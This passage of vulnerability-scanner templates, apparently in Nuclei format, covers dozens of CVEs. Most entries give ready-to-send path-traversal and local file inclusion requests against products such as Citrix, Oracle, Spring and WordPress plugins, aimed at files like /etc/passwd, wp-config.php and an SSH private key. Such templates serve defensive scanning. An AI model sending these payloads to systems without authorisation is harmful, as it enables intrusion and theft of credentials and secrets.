- {{BaseURL}}/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Processwire CMS \<2.7.1 - Local File Inclusion

## Description

- Processwire CMS prior to 2.7.1 is vulnerable to local file inclusion because it allows a remote attacker to retrieve sensitive files via the download parameter to index.php.
- severity - high
- tags - cve,cve2020,processwire,lfi,cms,oss

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?download=/etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# Car Rental Management System 1.0 - Local File Inclusion

## Description

- Car Rental Management System 1.0 allows an unauthenticated user to perform a file inclusion attack against the /index.php file with a partial filename in the "page" parameter, leading to code execution.
- severity - critical
- tags - cve,cve2020,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?page=/etc/passwd%00

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Citrix - Local File Inclusion

## Description

- Citrix ADC and Citrix Gateway versions before 13.0-58.30, 12.1-57.18, 12.0-63.21, 11.1-64.14 and 10.5-70.18 and Citrix SDWAN WAN-OP versions before 11.1.1a, 11.0.3d and 10.2.7 are vulnerable to local file inclusion because they allow unauthenticated access to certain URL endpoints.
- severity - medium
- tags - cve,cve2020,citrix,lfi,kev,packetstorm

## Requests

### Step - 1

```
POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1
Host: {{Hostname}}
Content-Type: application/xml
X-NITRO-USER: xpyZxwy6
X-NITRO-PASS: xWXHUJ56

\<appfwprofile>\<login>\</login>\</appfwprofile>

```

### Step - 2

```
GET /menu/ss?sid=nsroot&username=nsroot&force_setup=1 HTTP/1.1
Host: {{Hostname}}

```

### Step - 3

```
GET /menu/neo HTTP/1.1
Host: {{Hostname}}

```

### Step - 4

```
GET /menu/stc HTTP/1.1
Host: {{Hostname}}

```

### Step - 5

```
POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1
Host: {{Hostname}}
Content-Type: application/xml
X-NITRO-USER: oY39DXzQ
X-NITRO-PASS: ZuU9Y9c1
rand_key: {{randkey}}

\<appfwprofile>\<login>\</login>\</appfwprofile>

```

### Step - 6

```
POST /rapi/filedownload?filter=path:%2Fetc%2Fpasswd HTTP/1.1
Host: {{Hostname}}
Content-Type: application/xml
X-NITRO-USER: oY39DXzQ
X-NITRO-PASS: ZuU9Y9c1
rand_key: {{randkey}}

\<clipermission>\</clipermission>

```

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:
- part - body

### Extractors

**Type - regex**

- name - randkey
- part - body
- internal - True
- regex
  1. (?m)[0-9]{3,10}\.[0-9]+

---

# Citrix ShareFile StorageZones \<=5.10.x - Arbitrary File Read

## Description

- Citrix ShareFile StorageZones (aka storage zones) Controller versions through at least 5.10.x are susceptible to an unauthenticated arbitrary file read vulnerability.
- severity - high
- tags - cve,cve2020,citrix,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/XmlPeek.aspx?dt=\\..\\..\\..\\..\\..\\..\\Windows\\win.ini&x=/validate.ashx?requri

### Matchers

**Type - word**

- part - body
- words
  1. bit app support
  2. fonts
  3. extensions
- condition - and

**Type - status**

- status
  1. 200

---

# Kyocera Printer d-COPIA253MF - Directory Traversal

## Description

- Kyocera Printer d-COPIA253MF plus is susceptible to a directory traversal vulnerability which could allow an attacker to retrieve or view arbitrary files from the affected server.
- severity - high
- tags - cve,cve2020,printer,iot,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/wlmeng/../../../../../../../../../../../etc/passwd%00index.htm

### Matchers

**Type - word**

- part - body
- words
  1. root:.\*:0:0:
  2. bin:.\*:1:1
- condition - or

**Type - status**

- status
  1. 200

---

# Spring Cloud Config - Local File Inclusion

## Description

- Spring Cloud Config versions 2.2.x prior to 2.2.2, 2.1.x prior to 2.1.7, and older unsupported versions are vulnerable to local file inclusion because they allow applications to serve arbitrary configuration files through the spring-cloud-config-server module.
- severity - medium
- tags - cve,cve2020,lfi,springcloud

## Requests

- Method - GET

### URL

- {{BaseURL}}/a/b/%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd

### Matchers

**Type - status**

- status
  1. 200

**Type - regex**

- regex
  1. root:.\*:0:0:
- part - body

---

# GateOne 1.1 - Local File Inclusion

## Description

- GateOne 1.1 allows arbitrary file retrieval without authentication via /downloads/.. local file inclusion because os.path.join is incorrectly used.
- severity - high
- tags - cve,cve2020,gateone,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/downloads/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# LionWiki \<3.2.12 - Local File Inclusion

## Description

- LionWiki before 3.2.12 allows an unauthenticated user to read files as the web server user via crafted strings in the index.php f1 variable, aka local file inclusion.
- severity - high
- tags - cve,cve2020,lionwiki,lfi,oss

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?page=&action=edit&f1=.//./\.//./\.//./\.//./\.//./\.//./etc/passwd&restore=1

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0:

**Type - status**

- status
  1. 200

---

# Cisco SD-WAN vManage Software - Local File Inclusion

## Description

- Cisco SD-WAN vManage Software in the application data endpoints is vulnerable to local file inclusion which could allow an unauthenticated, remote attacker to gain access to sensitive information.

- severity - high
- tags - cve,cve2020,cisco,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/dataservice/disasterrecovery/download/token/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2Fetc%2Fpasswd

### Matchers

**Type - status**

- status
  1. 200

**Type - regex**

- regex
  1. root:.\*:0:0:
- part - body

---

# Apache Flink 1.5.1 - Local File Inclusion

## Description

- Apache Flink 1.5.1 is vulnerable to local file inclusion because of a REST handler that allows file uploads to an arbitrary location on the local file system through a maliciously modified HTTP HEADER.

- severity - high
- tags - lfi,flink,fileupload,vulhub,cve,cve2020,apache,intrusive

## Requests

### Step - 1

```
POST /jars/upload HTTP/1.1
Host: {{Hostname}}
Accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoZ8meKnrrso89R6Y

------WebKitFormBoundaryoZ8meKnrrso89R6Y
Content-Disposition: form-data; name="jarfile"; filename="../../../../../../../tmp/poc"

test-poc
------WebKitFormBoundaryoZ8meKnrrso89R6Y--

```

---

# Onkyo TX-NR585 Web Interface - Directory Traversal

## Description

- Onkyo TX-NR585 1000-0000-000-0008-0000 devices allows remote unauthenticated users on the network to read sensitive files via %2e%2e%2f directory traversal and local file inclusion.
- severity - high
- tags - cve,cve2020,onkyo,lfi,traversal

## Requests

- Method - GET

### URL

- {{BaseURL}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# Advanced Comment System 1.0 - Local File Inclusion

## Description

- ACS Advanced Comment System 1.0 is affected by local file inclusion via an advanced_component_system/index.php?ACS_path=..%2f URI.
- severity - high
- tags - acs,edb,seclists,cve,cve2020,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/advanced_component_system/index.php?ACS_path=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Oracle Fusion - Directory Traversal/Local File Inclusion

## Description

- Oracle Business Intelligence Enterprise Edition 5.5.0.0.0, 12.2.1.3.0, and 12.2.1.4.0 are vulnerable to local file inclusion vulnerabilities via "getPreviewImage."
- severity - high
- tags - cve,cve2020,oracle,lfi,kev,packetstorm

## Requests

- Method - GET

### URL

- {{BaseURL}}/analytics/saw.dll?bieehome&startPage=1
- {{BaseURL}}/analytics/saw.dll?getPreviewImage&previewFilePath=/etc/passwd

### Matchers

**Type - status**

- status
  1. 200

**Type - regex**

- regex
  1. root:.\*:0:0:
- part - body

---

# Apache Flink - Local File Inclusion

## Description

- Apache Flink 1.11.0 (and released in 1.11.1 and 1.11.2 as well) allows attackers to read any file on the local filesystem of the JobManager through the REST interface of the JobManager process (aka local file inclusion).
- severity - high
- tags - cve,cve2020,apache,lfi,flink

## Requests

- Method - GET

### URL

- {{BaseURL}}/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd

### Matchers

**Type - status**

- status
  1. 200

**Type - regex**

- regex
  1. root:.\*:0:0:
- part - body

---

# Citrix XenMobile Server - Local File Inclusion

## Description

- Citrix XenMobile Server 10.12 before RP2, Citrix XenMobile Server 10.11 before RP4, Citrix XenMobile Server 10.10 before RP6, and Citrix XenMobile Server before 10.9 RP5 are susceptible to local file inclusion vulnerabilities.
  reference:
- https://swarm.ptsecurity.com/path-traversal-on-citrix-xenmobile-server/
- https://support.citrix.com/article/CTX277457
- https://nvd.nist.gov/vuln/detail/CVE-2020-8209

- severity - high
- tags - cve,cve2020,citrix,lfi,xenmobile

## Requests

- Method - GET

### URL

- {{BaseURL}}/jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

**Type - word**

- part - header
- words
  1. fileDownload=true
  2. application/octet-stream
  3. attachment;
- condition - and

---

# NexusDB \<4.50.23 - Local File Inclusion

## Description

- NexusQA NexusDB before 4.50.23 allows the reading of files via ../ directory traversal and local file inclusion.
- severity - high
- tags - cve,cve2020,nexusdb,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/../../../../../../../../windows/win.ini

### Matchers

**Type - word**

- words
  1. [extensions]
- part - body

**Type - status**

- status
  1. 200

---

# WordPress Duplicator 1.3.24 & 1.3.26 - Local File Inclusion

## Description

- WordPress Duplicator 1.3.24 & 1.3.26 are vulnerable to local file inclusion vulnerabilities that could allow attackers to download arbitrary files, such as the wp-config.php file. According to the vendor, the vulnerability was only in two
  versions v1.3.24 and v1.3.26, the vulnerability wasn't
  present in versions 1.3.22 and before.

- severity - high
- tags - kev,tenable,packetstorm,cve,cve2020,wordpress,wp-plugin,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin-ajax.php?action=duplicator_download&file=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
- {{BaseURL}}/wp-admin/admin-ajax.php?action=duplicator_download&file=%2F..%2Fwp-config.php

### Matchers

**Type - status**

- status
  1. 200

**Type - regex**

- regex
  1. File Transfer
  2. application/octet-stream
  3. attachment; filename="(wp-config\.php|passwd)"
- condition - and
- part - header

**Type - regex**

- regex
  1. root:.\*:0:0:
  2. define\('DB\_(NAME|USER|PASSWORD|HOST|CHARSET|COLLATE)'
- condition - or
- part - body

---

# SearchBlox \<9.2.2 - Local File Inclusion

## Description

- SearchBlox prior to version 9.2.2 is susceptible to local file inclusion in FileServlet that allows remote, unauthenticated users to read arbitrary files from the operating system via a /searchblox/servlet/FileServlet?col=url= request. Additionally, this may be used to read the contents of the SearchBlox configuration file (e.g., searchblox/WEB-INF/config.xml), which contains both the Super Admin API key and the base64 encoded SHA1 password hashes of other SearchBlox users.
- severity - high
- tags - cve,cve2020,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/searchblox/servlet/FileServlet?col=9&url=/etc/passwd

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

---

# Next.js \<9.3.2 - Local File Inclusion

## Description

- Next.js versions before 9.3.2 are vulnerable to local file inclusion. An attacker can craft special requests to access files in the dist directory (.next). This does not affect files outside of the dist directory (.next). In general, the dist directory only holds build assets unless your application intentionally stores other assets under this directory.
- severity - medium
- tags - cve,cve2020,nextjs,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/\_next/static/../server/pages-manifest.json

### Matchers

**Type - regex**

- regex
  1. \{"/\_app":".\*?\_app\.js"
- part - body

**Type - word**

- words
  1. application/json
- part - header

**Type - status**

- status
  1. 200

---

# FHEM 6.0 - Local File Inclusion

## Description

- FHEM version 6.0 suffers from a local file inclusion vulnerability.
- severity - high
- tags - fhem,lfi,cve,cve2020

## Requests

- Method - GET

### URL

- {{BaseURL}}/fhem/FileLog_logWrapper?dev=Logfile&file=%2fetc%2fpasswd&type=text

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# ThinkAdmin 6 - Local File Inclusion

## Description

- ThinkAdmin version 6 is affected by a local file inclusion vulnerability because an unauthorized attacker can read arbitrary files on a remote server via GET request encode parameter.
- severity - high
- tags - thinkadmin,lfi,edb,packetstorm,cve,cve2020

## Requests

- Method - GET

### URL

- {{BaseURL}}/admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b2t382r1b342p37373b2s

### Matchers

**Type - status**

- status
  1. 200

**Type - regex**

- regex
  1. root:.\*:0:0:

---

# Zoho ManageEngine OpManger - Arbitrary File Read

## Description

- Zoho ManageEngine OpManager Stable build before 124196 and Released build before 125125 allows an unauthenticated attacker to read arbitrary files on the server by sending a specially crafted request.
- severity - high
- tags - cve,cve2020,zoho,lfi,manageengine

## Requests

### Step - 1

```
GET / HTTP/1.1
Host: {{Hostname}}
Accept: */*
Connection: close

```

### Step - 2

```
GET {{endpoint}}../../../../bin/.ssh_host_rsa_key HTTP/1.1
Host: {{Hostname}}
Accept: */*
Cache-Control: max-age=0
Connection: close
Referer: http://{{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. contains(body_2, "BEGIN RSA PRIVATE KEY")
  2. status_code_2 == 200
- condition - and

### Extractors

**Type - regex**

- name - endpoint
- part - body
- internal - True
- regex
  1. (?m)/cachestart/.\*/jquery/

---

# WordPress Simple Job Board \<2.9.4 - Local File Inclusion

## Description

- WordPress Simple Job Board prior to version 2.9.4 is vulnerable to arbitrary file retrieval vulnerabilities because it does not validate the sjb_file parameter when viewing a resume, allowing an authenticated user with the download_resume capability (such as HR users) to download arbitrary files from the web-server via local file inclusion.
- severity - high
- tags - authenticated,packetstorm,wp,cve2020,lfi,wordpress,wp-plugin,wpscan,cve

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/post.php?post=372&action=edit&sjb_file=../../../../etc/passwd HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# LimeSurvey 4.1.11 - Local File Inclusion

## Description

- LimeSurvey before 4.1.12+200324 is vulnerable to local file inclusion because it contains a path traversal vulnerability in application/controllers/admin/LimeSurveyFileManager.php.
- severity - critical
- tags - cve2020,lfi,edb,packetstorm,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php/admin/filemanager/sa/getZipFile?path=/../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Suprema BioStar \<2.8.2 - Local File Inclusion

## Description

- Suprema BioStar before 2.8.2 Video Extension allows remote attackers can read arbitrary files from the server via local file inclusion.
- severity - high
- tags - suprema,biostar2,packetstorm,cve,cve2020,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/../../../../../../../../../../../../windows/win.ini

### Matchers

**Type - word**

- part - body
- words
  1. bit app support
  2. fonts
  3. extensions
- condition - and

---

# Lotus Core CMS 1.0.1 - Local File Inclusion

## Description

- Lotus Core CMS 1.0.1 allows authenticated local file inclusion of .php files via directory traversal in the index.php page_slug parameter.
- severity - high
- tags - cve2020,lfi,lotus,cms,edb,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?page_slug=../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Commvault CommCell - Local File Inclusion

## Description

- CommCell in Commvault before 14.68, 15.x before 15.58, 16.x before 16.44, 17.x before 17.29, and 18.x before 18.13 are vulnerable to local file inclusion because an attacker can view a log file can instead view a file outside of the log-files folder.
- severity - high
- tags - cve,cve2020,commvault,lfi

## Requests

- Method - POST
- Method - POST

### URL

- http://{{Host}}:81/SearchSvc/CVSearchService.svc
  - \<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
    \<soapenv:Header/>
    \<soapenv:Body>
    \<tem:downLoadFile>
    \<tem:path>c:/Windows/system.ini\</tem:path>
    \</tem:downLoadFile>
    \</soapenv:Body>
    \</soapenv:Envelope>

### Matchers

**Type - word**

- words
  1. downLoadFileResult

**Type - status**

- status
  1. 200

---

# Artica Proxy Community Edition \<4.30.000000 - Local File Inclusion

## Description

- Artica Proxy Community Edition before 4.30.000000 is vulnerable to local file inclusion via the fw.progrss.details.php popup parameter.
- severity - high
- tags - cve,cve2020,artica,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/fw.progrss.details.php?popup=..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# WordPress Mail Masta 1.0 - Local File Inclusion

## Description

- WordPress Mail Masta 1.0 is susceptible to local file inclusion in count_of_send.php and csvexport.php.
- severity - high
- tags - cve,cve2016,wordpress,wp-plugin,lfi,mail

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
- {{BaseURL}}/wp-content/plugins/mail-masta/inc/lists/csvexport.php?pl=/etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:
- part - body

**Type - status**

- status
  1. 200
  2. 500

---

# Trend Micro Threat Discovery Appliance 2.6.1062r1 - Authentication Bypass

## Description

- Trend Micro Threat Discovery Appliance 2.6.1062r1 is vulnerable to a directory traversal vulnerability when processing a session_id cookie, which allows a remote, unauthenticated attacker to delete arbitrary files as root. This can be used to bypass authentication or cause a DoS.
- severity - critical
- tags - msf,cve,cve2016,lfi,auth,bypass

## Requests

- Method - GET

### URL

- {{BaseURL}}/cgi-bin/logoff.cgi

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. Memory map
- part - body

---

# Opsview Monitor Pro - Local File Inclusion

## Description

- Opsview Monitor Pro prior to 5.1.0.162300841, prior to 5.0.2.27475, prior to 4.6.4.162391051, and 4.5.x without a certain 2016 security patch is vulnerable to unauthenticated local file inclusion and can be exploited by issuing a specially crafted HTTP GET request utilizing a simple bypass.
- severity - high
- tags - cve,cve2016,opsview,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/monitoring/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 404

---

# ZOHO WebNMS Framework 5.2 and 5.2 SP1 - Directory Traversal

## Description

- Directory traversal vulnerability in the file download functionality in ZOHO WebNMS Framework 5.2 and 5.2 SP1 allows remote attackers to read arbitrary files via a .. (dot dot) in the fileName parameter to servlets/FetchFile
- severity - high
- tags - edb,cve,cve2016,zoho,lfi,webnms

## Requests

- Method - GET

### URL

- {{BaseURL}}/servlets/FetchFile?fileName=../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0

**Type - status**

- status
  1. 200

---

# SAP xMII 15.0 for SAP NetWeaver 7.4 - Local File Inclusion

## Description

- SAP xMII 15.0 for SAP NetWeaver 7.4 is susceptible to a local file inclusion vulnerability in the GetFileList function. This can allow remote attackers to read arbitrary files via a .. (dot dot) in the path parameter to /Catalog, aka SAP Security Note 2230978.
- severity - high
- tags - lfi,sap,packetstorm,edb,cve,cve2016

## Requests

- Method - GET

### URL

- {{BaseURL}}/XMII/Catalog?Mode=GetFileList&Path=Classes/../../../../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Wordpress Zedna eBook download \<1.2 - Local File Inclusion

## Description

- Wordpress Zedna eBook download prior to version 1.2 was affected by a filedownload.php local file inclusion vulnerability.

- severity - high
- tags - cve,wordpress,edb,cve2016,wp-plugin,lfi,ebook,wp,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php

### Matchers

**Type - word**

- part - body
- words
  1. DB_NAME
  2. DB_PASSWORD
- condition - and

**Type - status**

- status
  1. 200

---

# Zeta Producer Desktop CMS \<14.2.1 - Local File Inclusion

## Description

- Zeta Producer Desktop CMS before 14.2.1 is vulnerable to local file inclusion if the plugin "filebrowser" is installed because of assets/php/filebrowser/filebrowser.main.php?file=../ directory traversal.
- severity - medium
- tags - cve,cve2018,lfi,edb,packetstorm

## Requests

- Method - GET

### URL

- {{BaseURL}}/assets/php/filebrowser/filebrowser.main.php?file=../../../../../../../../../../etc/passwd&do=download

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Wowza Streaming Engine Manager 4.7.4.01 - Directory Traversal

## Description

- Wowza Streaming Engine 4.7.4.01 allows traversal of the directory structure and retrieval of a file via a remote, specifically crafted HTTP request to the REST API.
- severity - high
- tags - cve,cve2018,wowza,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/enginemanager/server/logs/download?logType=error&logName=../../../../../../../../etc/passwd&logSource=engine

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Microstrategy Web 7 - Local File Inclusion

## Description

- Microstrategy Web 7 is vulnerable to local file inclusion via "/WebMstr7/servlet/mstrWeb" (in the parameter subpage). Remote authenticated users can bypass intended SecurityManager restrictions and list a parent directory via a /.. (slash dot dot) in a pathname used by a web application. NOTE: this is a deprecated product.

- severity - medium
- tags - traversal,edb,packetstorm,cve,cve2018,microstrategy,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/WebMstr7/servlet/mstrWeb?evt=3045&src=mstrWeb.3045&subpage=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Jtag Members Directory 5.3.7 - Local File Inclusion

## Description

- Joomla! Jtag Members Directory 5.3.7 is vulnerable to local file inclusion via the download_file parameter.
- severity - high
- tags - cve,cve2018,joomla,lfi,edb,packetstorm

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_jtagmembersdirectory&task=attachment&download_file=../../../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Zyxel VMG1312-B10D 5.13AAXA.8 - Local File Inclusion

## Description

- Zyxel VMG1312-B10D 5.13AAXA.8 is susceptible to local file inclusion. A remote unauthenticated attacker can send a specially crafted URL request containing "dot dot" sequences (/../), conduct directory traversal attacks, and view arbitrary files.

- severity - high
- tags - lfi,modem,router,edb,cve,cve2018,zyxel

## Requests

- Method - GET

### URL

- {{BaseURL}}/../../../../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

**Type - word**

- part - header
- words
  1. application/octet-stream

---

# Schools Alert Management Script - Arbitrary File Read

## Description

- Schools Alert Management Script is susceptible to an arbitrary file read vulnerability via the f parameter in img.php, aka absolute path traversal.
- severity - high
- tags - cve,cve2018,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/img.php?f=/./etc/./passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Loytec LGATE-902 \<6.4.2 - Local File Inclusion

## Description

- Loytec LGATE-902 versions prior to 6.4.2 suffers from a local file inclusion vulnerability.
- severity - critical
- tags - cve2018,loytec,lfi,packetstorm,seclists,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/webui/file_guest?path=/var/www/documentation/../../../../../etc/passwd&flags=1152

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# PHP Proxy 3.0.3 - Local File Inclusion

## Description

- PHP Proxy 3.0.3 is susceptible to local file inclusion vulnerabilities that allow unauthenticated users to read files from the server via index.php?q=file:/// (a different vulnerability than CVE-2018-19246).

- severity - high
- tags - edb,cve,cve2018,lfi,proxy

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?q=file:///etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Spring MVC Framework - Local File Inclusion

## Description

- Spring MVC Framework versions 5.0 prior to 5.0.5 and versions 4.3 prior to 4.3.15 and older unsupported are vulnerable to local file inclusion because they allow applications to configure Spring MVC to serve static resources (e.g. CSS, JS, images). A malicious user can send a request using a specially crafted URL that can lead a directory traversal attack.
- severity - medium
- tags - cve,cve2018,spring,lfi,traversal

## Requests

- Method - GET

### URL

- {{BaseURL}}/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
- {{BaseURL}}/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini

### Matchers

**Type - word**

- words
  1. for 16-bit app support

**Type - status**

- status
  1. 200

---

# WordPress Site Editor \<=1.1.1 - Local File Inclusion

## Description

- WordPress Site Editor through 1.1.1 allows remote attackers to retrieve arbitrary files via the ajax_path parameter to editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php.

- severity - high
- tags - cve,cve2018,wordpress,wp-plugin,lfi,edb,seclists

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=../../../../../../../wp-config.php
- {{BaseURL}}/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd

### Matchers

**Type - word**

- part - body
- words
  1. DB_NAME
  2. DB_PASSWORD
- condition - and

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

---

# cgit \< 1.2.1 - Directory Traversal

## Description

- cGit \< 1.2.1 via cgit_clone_objects has a directory traversal vulnerability when `enable-http-clone=1` is not turned off, as demonstrated by a cgit/cgit.cgi/git/objects/?path=../ request.
- severity - high
- tags - cve,cve2018,cgit,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/cgit/cgit.cgi/git/objects/?path=../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# AxxonSoft Axxon Next - Local File Inclusion

## Description

- AxxonSoft Axxon Next suffers from a local file inclusion vulnerability.
- severity - high
- tags - axxonsoft,lfi,packetstorm,cve,cve2018

## Requests

### Step - 1

```
GET //css//..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows\win.ini HTTP/1.1
Host: {{Hostname}}


```

### Matchers

**Type - word**

- part - body
- words
  1. bit app support
  2. fonts
  3. extensions
- condition - and

---

# LOYTEC LGATE-902 6.3.2 - Local File Inclusion

## Description

- LOYTEC LGATE-902 6.3.2 is susceptible to local file inclusion which could allow an attacker to manipulate path references and access files and directories (including critical system files) that are stored outside the root folder of the web application running on the device. This can be used to read and configuration files containing, e.g., usernames and passwords.

- severity - high
- tags - loytec,lfi,seclists,packetstorm,cve,cve2018,lgate

## Requests

- Method - GET

### URL

- {{BaseURL}}/webui/file_guest?path=/var/www/documentation/../../../../../etc/passwd&flags=1152

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# VelotiSmart Wifi - Directory Traversal

## Description

- VelotiSmart WiFi B-380 camera devices allow directory traversal via the uc-http service 1.0.0, as demonstrated by /../../etc/passwd on TCP port 80.
- severity - critical
- tags - edb,cve,cve2018,lfi,camera,iot

## Requests

- Method - GET

### URL

- {{BaseURL}}/../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# Rubedo CMS \<=3.4.0 - Directory Traversal

## Description

- Rubedo CMS through 3.4.0 contains a directory traversal vulnerability in the theme component, allowing unauthenticated attackers to read and execute arbitrary files outside of the service root path, as demonstrated by a /theme/default/img/%2e%2e/..//etc/passwd URI.
- severity - critical
- tags - cve,cve2018,rubedo,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/theme/default/img/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Gogs (Go Git Service) 0.11.66 - Remote Code Execution

## Description

